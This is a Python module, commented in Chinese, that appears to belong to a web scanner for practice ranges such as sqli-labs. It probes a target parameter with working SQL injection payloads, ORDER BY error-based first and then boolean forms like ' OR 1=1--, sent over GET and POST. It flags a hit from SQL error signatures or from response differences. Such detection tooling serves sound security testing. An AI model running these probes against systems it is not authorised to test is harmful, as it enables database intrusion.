# modules/sql_injection.py
"""
更强的 SQL 注入检测模块（优先 error-based ORDER BY 探测）
特性：
- 增加 ORDER BY 列号探测（error-based），适合 sqli-labs / 类似靶场；
- 优先执行 error-based payloads；其次 boolean/content；最后（可选）time-based；
- 一旦发现第一个有效证据立即停止并返回 vulnerable_payload；
- 只输出有意义的 evidence（命中或网络/错误），并记录 attempts_tried。
"""

import time
import requests
from typing import Optional
from difflib import SequenceMatcher

# 1) ORDER BY 检测（error-based）: 会触发 Unknown column / order clause 错误
#    我们尝试若干列号（从 2 到 6），同时尝试带/不带引号的变体
ORDER_BY_RANGE = range(2, 7)  # 测试 order by 2..6

# 2) 常规 payload（boolean / classic）
BOOLEAN_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
    "1' AND '1'='1",  # 例子
]

# 3) （可后续加入）time-based payloads，例如 SLEEP(5) 等（此处保留扩展点）
TIME_BASED_PAYLOADS = [
    # "1' AND SLEEP(5)--+"
]

# 阈值与超时
DIFF_THRESHOLD = 0.85
LENGTH_DIFF_THRESHOLD = 40
TIMEOUT = 6.0

# 错误指纹扩展（包括 ORDER BY 导致的错误）
SQL_ERROR_SIGS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql syntax",
    "mysql_fetch",
    "syntax error",
    "unknown column",           # ORDER BY 导致的 unknown column 'N'
    "order clause",             # 更泛的 order 相关错误提示
    "mysql_num_rows()",         # 其它可能的提示
]

def _similarity_ratio(a: str, b: str) -> float:
    if a is None:
        a = ""
    if b is None:
        b = ""
    try:
        return SequenceMatcher(None, a, b).ratio()
    except Exception:
        return 0.0

def _make_get_url(base: str, param_name: str, payload: str) -> str:
    from requests.utils import requote_uri
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}{param_name}={requote_uri(payload)}"

def _make_get_url_with_submit(base: str, param_name: str, payload: str) -> str:
    from requests.utils import requote_uri
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}{param_name}={requote_uri(payload)}&Submit=Submit"

def _make_post_data(param_name: str, payload: str) -> dict:
    return {param_name: payload, 'Submit': 'Submit'}

def _has_sql_error_signature(text: str) -> Optional[str]:
    """返回匹配到的错误签名短语（或 None）"""
    if not text:
        return None
    l = text.lower()
    for sig in SQL_ERROR_SIGS:
        if sig in l:
            return sig
    return None

def scan(target: str, param_name: str = 'q', session: Optional[requests.Session] = None) -> dict:
    """
    扫描入口：
    - 优先尝试 ORDER BY 错误型探测（带/不带引号、GET/GET+Submit/POST）
    - 然后尝试 boolean/payload
    - 最后（可选）尝试 time-based
    """
    res = {
        'name': 'sql_injection',
        'target': target,
        'detected': False,
        'vulnerable_payload': None,
        'evidence': [],
        'attempts_tried': 0,
        'notes': 'Enhanced: ORDER BY error-based first, then boolean/content diff.'
    }

    requester = session if session is not None else requests

    # baseline 请求
    try:
        t0 = time.time()
        r0 = requester.get(target, timeout=TIMEOUT)
        t1 = time.time()
        baseline_body = r0.text or ""
        baseline_len = len(baseline_body)
    except Exception as e:
        res['notes'] = f'Baseline request failed: {e}'
        return res

    # --- 1) ORDER BY error-based 检测（优先） ---
    # 变体：不带引号的 numeric: e.g., id=1 order by 4--+
    #       带引号的 string: e.g., id=1' order by 4--+
    for n in ORDER_BY_RANGE:
        # 三种变体（不带引号 GET, 带 Submit GET, 带引号 GET）
        payloads_this_round = [
            f"1 order by {n}--+",
            f"1' order by {n}--+",
            f"1\" order by {n}--+",
        ]
        for payload in payloads_this_round:
            # 我们尝试 GET, GET+Submit, POST
            attempts = [
                ('GET', _make_get_url(target, param_name, payload), None),
                ('GET', _make_get_url_with_submit(target, param_name, payload), None),
                ('POST', target, _make_post_data(param_name, payload)),
            ]
            for method, url, data in attempts:
                res['attempts_tried'] += 1
                try:
                    start = time.time()
                    if method == 'GET':
                        r = requester.get(url, timeout=TIMEOUT)
                    else:
                        r = requester.post(url, data=data, timeout=TIMEOUT)
                    end = time.time()
                    body = r.text or ""
                    status = r.status_code
                    elapsed = round(end - start, 3)
                    length = len(body)
                except Exception as e:
                    res['evidence'].append({
                        'payload': payload,
                        'method': method,
                        'url': url,
                        'data': data,
                        'reason': 'network_error',
                        'error': str(e)
                    })
                    continue

                # 检查错误签名（特别关注 unknown column / order clause）
                matched = _has_sql_error_signature(body)
                if matched:
                    attempt = {
                        'payload': payload,
                        'method': method,
                        'url': url,
                        'data': data,
                        'status_code': status,
                        'time': elapsed,
                        'length': length,
                        'diff_ratio': round(_similarity_ratio(baseline_body, body), 4),
                        'reason': 'order_by_error' if 'order' in matched or 'unknown column' in matched else 'sql_error_signature',
                        'matched_signature': matched
                    }
                    res['detected'] = True
                    res['vulnerable_payload'] = payload
                    res['evidence'] = [attempt]
                    return res
                # 否则继续尝试下一个

    # --- 2) boolean/content-based / original payloads ---
    for payload in BOOLEAN_PAYLOADS:
        attempts = [
            ('GET', _make_get_url(target, param_name, payload), None),
            ('GET', _make_get_url_with_submit(target, param_name, payload), None),
            ('POST', target, _make_post_data(param_name, payload)),
        ]
        for method, url, data in attempts:
            res['attempts_tried'] += 1
            try:
                start = time.time()
                if method == 'GET':
                    r = requester.get(url, timeout=TIMEOUT)
                else:
                    r = requester.post(url, data=data, timeout=TIMEOUT)
                end = time.time()
                body = r.text or ""
                status = r.status_code
                elapsed = round(end - start, 3)
                length = len(body)
            except Exception as e:
                res['evidence'].append({
                    'payload': payload,
                    'method': method,
                    'url': url,
                    'data': data,
                    'reason': 'network_error',
                    'error': str(e)
                })
                continue

            # 先看是否有明显的错误签名
            matched = _has_sql_error_signature(body)
            if matched:
                attempt = {
                    'payload': payload,
                    'method': method,
                    'url': url,
                    'data': data,
                    'status_code': status,
                    'time': elapsed,
                    'length': length,
                    'diff_ratio': round(_similarity_ratio(baseline_body, body), 4),
                    'reason': 'sql_error_signature',
                    'matched_signature': matched
                }
                res['detected'] = True
                res['vulnerable_payload'] = payload
                res['evidence'] = [attempt]
                return res

            # 否则用内容差异启发式判断
            ratio = _similarity_ratio(baseline_body, body)
            len_diff = abs(length - baseline_len)
            if ratio < DIFF_THRESHOLD or len_diff > LENGTH_DIFF_THRESHOLD:
                attempt = {
                    'payload': payload,
                    'method': method,
                    'url': url,
                    'data': data,
                    'status_code': status,
                    'time': elapsed,
                    'length': length,
                    'len_diff': len_diff,
                    'diff_ratio': round(ratio, 4),
                    'reason': 'content_diff'
                }
                res['detected'] = True
                res['vulnerable_payload'] = payload
                res['evidence'] = [attempt]
                return res

    # --- 3) （可选）time-based 盲注检测（未启用，留接口扩展） ---
    # for payload in TIME_BASED_PAYLOADS:
    #     ... (实现类似：检测响应时间 > threshold)

    # 未检测到
    return res
